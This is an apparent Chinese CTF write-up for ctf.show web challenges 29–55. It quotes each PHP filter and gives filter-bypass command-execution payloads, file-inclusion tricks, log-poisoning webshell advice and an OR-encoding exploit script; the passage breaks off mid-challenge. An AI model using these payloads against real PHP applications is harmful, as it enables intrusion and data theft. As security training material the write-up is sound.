这里过滤了关键字flag，system还有php，由于过滤了system我们需要使用其他的系统函数进行命令执行\npayload:\nc=printf(exec(\u0026ldquo;cat%20fl*\u0026rdquo;));\nc=echo exec(\u0026ldquo;cat f\\lag.p\\hp\u0026rdquo;);\nc=show_source(scandir(\u0026rdquo;.\u0026rdquo;)[2]); (这个函数会返回一个包含当前目录下所有文件和目录项的数组)\nc=highlight_file(next(array_reverse(scandir(\u0026rdquo;.\u0026rdquo;))));\nc=passthru(\u0026ldquo;tac fla*\u0026rdquo;);\nc=echo `tac fla*`;\nc=$a=sys;$b=tem;$c=$a.$b;$c(\u0026ldquo;tac fla*\u0026rdquo;);*\nc=echo shell_exec(\u0026ldquo;tac fla*\u0026rdquo;);\nc=eval($_GET[1]);\u0026amp;1=system(\u0026ldquo;tac flag.php\u0026rdquo;);\nc=passthru(base64_decode(\u0026ldquo;Y2F0IGZsYWcucGhw==\u0026rdquo;));(base64绕过)\n\u0026hellip;\u0026hellip;\nweb31 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:49:10 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'\npayload:\nc=eval($_GET[1]);\u0026amp;1=system(\u0026ldquo;tac flag.php\u0026rdquo;); c=show_source(scandir(getcwd())[2]); c=show_source(next(array_reverse(scandir(pos(localeconv()))))); c=passthru(\u0026ldquo;tac%09fla*\u0026rdquo;); c=echo`tac%09fla*`; web32 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:56:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(\n过滤了空格可以用${IFS}和%0a 代替，分号可以用?\u0026gt;代替\n用include构造payload：\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\n得到的结果用base64解码一下就可以得到flag了\n或者用日志注入：\nurl/?c=include$_GET[1]?%3E\u0026amp;1=../../../../var/log/nginx/access.log /var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可\nweb33 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 02:22:27 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12// 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\\u0026#34;/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽的关键词比上一题多了个双引号 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|\u0026quot;\n继续使用include构造payload：\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb34 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽的关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;\n继续使用include构造payload：\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb35 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;|\u0026lt;|=\n继续使用include构造payload：（wsm还能秒）\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb36 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-04 00:12:34 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-04 04:21:16 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=|\\/|[0-9]/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键字 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;|\u0026lt;|=|/|[0-9]\n不是哥们，数字也要屏蔽，那我改一下不就好了\n继续使用include构造payload：\nurl/?c=include$_GET[m]?\u0026gt;\u0026amp;m=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[m]?\u0026gt;\u0026amp;m=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb37 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:18:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} 不是哥们，怎么还是文件包含\npayload：\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\n或者\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb38 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:23:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|php|file/i\u0026#34;, $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} payload:\n?c=data://text/plain,\u003c?=system(\"tac%20fla*\")?\u003e\n或者\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb39 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:13:21 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 include($c.\u0026#34;.php\u0026#34;); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这里会在我们传入的c后面拼接一段.php\n我们只需要在加入\u003c?php ?\u003e那么php就只会执行中间的代码，后面的内容不会执行\n故payload：\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\nweb40 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:03:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\\u0026#39;|\\\u0026#34;|\\,|\\\u0026lt;|\\.|\\\u0026gt;|\\/|\\?|\\\\\\\\/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键词 /[0-9]|~|`|@|#|\\$|%|^|\u0026amp;|*|\\（|\\）|-|=|+|{|[|]|}|:|'|\u0026quot;|,|\u0026lt;|.|\u0026gt;|/|?|\\\\\n这里要使用无参命令执行\npayload：\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\n关于无参命令执行的一些解释\nweb41 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: 羽 6# @Date: 2020-09-05 20:31:22 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:40:07 9# @email: 1341963450@qq.com 10# @link: https://ctf.show 11 12*/ 13 14if(isset($_POST[\u0026#39;c\u0026#39;])){ 15 $c = $_POST[\u0026#39;c\u0026#39;]; 16if(!preg_match(\u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;, $c)){ 17 eval(\u0026#34;echo($c);\u0026#34;); 18 } 19}else{ 20 highlight_file(__FILE__); 21} 22?\u0026gt; 过滤内容：/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\n这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。 我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。\n大佬的脚本\n1\u0026lt;?php 2$myfile = fopen(\u0026#34;rce_or.txt\u0026#34;, \u0026#34;w\u0026#34;); 3$contents=\u0026#34;\u0026#34;; 4for ($i=0; $i \u0026lt; 256; $i++) { 5\tfor ($j=0; $j \u0026lt;256 ; $j++) { 6 7\tif($i\u0026lt;16){ 8\t$hex_i=\u0026#39;0\u0026#39;.dechex($i); 9\t} 10\telse{ 11\t$hex_i=dechex($i); 12\t} 13\tif($j\u0026lt;16){ 14\t$hex_j=\u0026#39;0\u0026#39;.dechex($j); 15\t} 16\telse{ 17\t$hex_j=dechex($j); 18\t} 19\t$preg = \u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;; 20\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 21\techo \u0026#34;\u0026#34;; 22 } 23 24\telse{ 25\t$a=\u0026#39;%\u0026#39;.$hex_i; 26\t$b=\u0026#39;%\u0026#39;.$hex_j; 27\t$c=(urldecode($a)|urldecode($b)); 28\tif (ord($c)\u0026gt;=32\u0026amp;ord($c)\u0026lt;=126) { 29\t$contents=$contents.$c.\u0026#34; \u0026#34;.$a.\u0026#34; \u0026#34;.$b.\u0026#34;\\n\u0026#34;; 30\t} 31\t} 32 33} 34} 35fwrite($myfile,$contents); 36fclose($myfile); 1# -*- coding: utf-8 -*- 2import requests 3import urllib 4from sys import * 5import os 6os.system(\u0026#34;php rce_or.php\u0026#34;) #没有将php写入环境变量需手动运行 7if(len(argv)!=2): 8 print(\u0026#34;=\u0026#34;*50) 9 print(\u0026#39;USER：python exp.py \u0026lt;url\u0026gt;\u0026#39;) 10 print(\u0026#34;eg： python exp.py http://ctf.show/\u0026#34;) 11 print(\u0026#34;=\u0026#34;*50) 12 exit(0) 13url=argv[1] 14def action(arg): 15 s1=\u0026#34;\u0026#34; 16 s2=\u0026#34;\u0026#34; 17 for i in arg: 18 f=open(\u0026#34;rce_or.txt\u0026#34;,\u0026#34;r\u0026#34;) 19 while True: 20 t=f.readline() 21 if t==\u0026#34;\u0026#34;: 22 break 23 if t[0]==i: 24 #print(i) 25 s1+=t[2:5] 26 s2+=t[6:9] 27 break 28 f.close() 29 output=\u0026#34;(\\\u0026#34;\u0026#34;+s1+\u0026#34;\\\u0026#34;|\\\u0026#34;\u0026#34;+s2+\u0026#34;\\\u0026#34;)\u0026#34; 30 return(output) 31 32while True: 33 param=action(input(\u0026#34;\\n[+] your function：\u0026#34;) )+action(input(\u0026#34;[+] your command：\u0026#34;)) 34 data={ 35 \u0026#39;c\u0026#39;:urllib.parse.unquote(param) 36 } 37 r=requests.post(url,data=data) 38 print(\u0026#34;\\n[*] result:\\n\u0026#34;+r.text) 将两个文件放在同一个文件夹，运行exp.py即可\n羽师傅nb\n注意链接要用http不能用https\nweb42 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 20:51:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 18}else{ 19 highlight_file(__FILE__); 20} 这道题会将我们输入的命令与\u0026quot; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026quot;进行拼接\n/dev/null 2\u0026gt;\u0026amp;1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显\n导致我们无法成功执行\n我们可以通过%0a截断的方式绕过\ntac fl*%0a\nor\n; //分号 | //只执行后面那条命令 || //只执行前面那条命令 \u0026amp; //两条命令都会执行 \u0026amp;\u0026amp; //两条命令都会执行\n过滤了分号和cat，可以用||和\u0026amp;来代替分号，tac代替cat\n可构造playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 注意，这里的\u0026amp;需要url编码\nweb43 过滤了cat、；，\n不是很影响\ntac fl*%0a\ror\rtac flag.php||\r...\r//记得转url编码 web44 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:32:01 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/;|cat|flag/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了;|cat|flag\n小问题\ntac fl*%0a\ror\rtac f*||\r...\r//记得转url编码 web45 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:35:34 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| /i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了;|cat|flag和空格\n可以用%09或$IFS$9代替空格\ntac%09fl*%0a\ror\rtac%09f*||\ror\recho$IFS`tac$IFS*`%0A\r...\r//记得转url编码 web46 \u0026lt;?php\r/*\r# -*- coding: utf-8 -*-\r# @Author: h1xa\r# @Date: 2020-09-05 20:49:30\r# @Last Modified by: h1xa\r# @Last Modified time: 2020-09-05 21:50:19\r# @email: h1xa@ctfer.com\r# @link: https://ctfer.com\r*/\rif(isset($_GET[\u0026#39;c\u0026#39;])){\r$c=$_GET[\u0026#39;c\u0026#39;];\rif(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\u0026#34;, $c)){\rsystem($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;);\r}\r}else{\rhighlight_file(__FILE__);\r} 过滤有点多啊\n;|cat|flag| |[0-9]|\\$|*\n但是事实上我们上题使用的方法并不会受到影响，因为%09是url编码，不会被当成数字过滤\ntac%09fl*%0a\ror\rtac%09f*||\ror\rtac\u0026lt;f*||\r//记得转url编码 web47 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:59:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤这么多O.o？\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail\n但是幸好我用的是tac\ntac%09fl*%0a\ror\rtac%09f*||\ror\rtac\u0026lt;f*||\r//记得转url编码 web48 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:06:20 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤更多了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`\ntac%09fl??.php%0a\ror\rtac%09fl??.php%7c%7c //记得转url编码 web49 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:22:43 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%\n虽然过滤了%但是是不影响我们传入的url编码的\ntac%09fl??.php%0a\ror\rtac%09fl??.php%7c%7c web50 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:32:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%|\\x09|\\x26\n坏，没法用%09代替空格，没法用?代替字符\n不过幸好还有\u0026lt;和\u0026rsquo;'\ntac\u0026lt;fla%27%27g.php||\ror\rtac\u0026lt;fla%27%27g.php%0a web51 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:42:52 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26/\n怎么把我tac也过滤了\n没事能绕过\nt%27%27ac\u0026lt;fla%27%27g.php||\ror\rt%27%27ac\u0026lt;fla%27%27g.php%0a web51 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:50:30 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;\n我测怎么连\u0026lt; \u0026gt;都要过滤\n别忘了还可以用$IFS\nca%27%27t$IFS/fla%27%27g||\ror\rca%27%27t$IFS/fla%27%27g%0a web52 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 18:21:02 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 echo($c); 19 $d = system($c); 20 echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$d; 21 }else{ 22 echo \u0026#39;no\u0026#39;; 23 } 24}else{ 25 highlight_file(__FILE__); 26} 过滤了\n;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;/\n这题没有在后面进行命令拼接，其他和上一题一样\nc%27%27at${IFS}fla%27%27g.php web54 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 19:43:42 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 这题过滤了很多命令,题目通过*使得只要是传入的内容出现如cat三个字符即可被匹配到，无法使用之前的字符拼接方法绕过\n这题没过率通配符?\n解一\n/bin/?at${IFS}f??????? cat命令所在的路径是在/bin/目录下，所以这里相当于直接调用了cat文件执行命令，这里的cat可以看作命令，也是一个文件，所以通配符可以用在这上面（一开始还傻傻的换成uniq看能不能用hhh）。\nbin下的命令：Linux /bin 目录下命令简要说明 - 崔旗 - 博客园\n同理bin目录下还存在more，所以这里的cat我们换成more也可以读取flag。 解二\nvi${IFS}fla?.php or\rc=uniq${IFS}f???.php //倒序的\ror\rgrep${IFS}%27fla%27${IFS}f???????%0a web55 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 20:03:51 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/ 这题涉及到一个知识点\n也就是无字母数字的命令执行\nhttps://blog.csdn.net/qq_46091464/article/details/108513145\nhttps://blog.csdn.net/qq_46091464/article/details/108557067\n无字母数字webshell之提高篇 | 离别歌\n思路\nshell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替 我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）\n注意：通过`.`去执行sh命令不需要有执行权限 1.构造post数据包\n1\u0026lt;!DOCTYPE 